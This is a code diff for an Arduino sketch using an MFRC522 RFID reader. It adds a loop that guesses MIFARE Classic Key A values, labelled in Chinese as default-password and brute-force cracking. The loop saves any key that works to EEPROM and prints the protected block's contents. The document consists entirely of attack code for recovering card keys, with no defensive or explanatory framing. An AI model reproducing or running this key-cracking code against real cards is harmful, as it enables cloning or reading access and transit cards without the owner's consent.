@@ -74,6 +74,59 @@
   
   mfrc522.PICC_DumpDetailsToSerial(&(mfrc522.uid));
  
+  //默认密码破解
+  for (key_6=0;key_6<256;key_6++){
+    key={(unsigned char)key_1,(unsigned char)key_2,(unsigned char)key_3,(unsigned char)key_4,(unsigned char)key_5,(unsigned char)key_6};
+    status = mfrc522.PCD_Authenticate(MFRC522::PICC_CMD_MF_AUTH_KEY_A, block, &key, &(mfrc522.uid));
+    if (status == MFRC522::STATUS_OK) {
+       delay(5000);
+       Serial.print("PCD_Authenticate OK");
+       EEPROM.write(block*6-1,key_1);
+       EEPROM.write(block*6-1+1,key_2);
+       EEPROM.write(block*6-1+2,key_3);
+       EEPROM.write(block*6-1+3,key_4);
+       EEPROM.write(block*6-1+4,key_5);
+       EEPROM.write(block*6-1+5,key_6);
+
+       // 读取区中数据
+       byte byteCount = sizeof(buffer);
+       status = mfrc522.MIFARE_Read(block, buffer, &byteCount);
+       if (status != MFRC522::STATUS_OK) {
+         Serial.print("MIFARE_Read() failed: ");
+         Serial.println(mfrc522.GetStatusCodeName(status));
+       }
+       else{
+         Serial.println("当前区的HEX数据: ");
+         printHex16(buffer, 16);
+         Serial.println("当前区的DEC数据: ");
+         printDec16(buffer, 16);
+       }
+
+      Serial.println("Key is: ");
+      printHex(key.keyByte, MFRC522::MF_KEY_SIZE);
+      Serial.print("Block:");
+      Serial.println(block);
+
+      key_1=0;
+      key_2=0;
+      key_3=0;
+      key_4=0;
+      key_5=0;
+      key_6=0;  
+      block++;
+      mfrc522.PICC_HaltA(); // Halt PICC
+      mfrc522.PCD_StopCrypto1();  // Stop encryption on PCD
+      return;
+     }else{
+      Serial.println("Just Now trying: ");
+      printHex(key.keyByte, MFRC522::MF_KEY_SIZE);
+      Serial.print("Block:");
+      Serial.println(block);
+     }
+ }
+
+
+  //暴力破解
   for (key_1=0;key_1<256;key_1++){
    for (key_2=0;key_2<256;key_2++){
     for (key_3=0;key_3<256;key_3++){
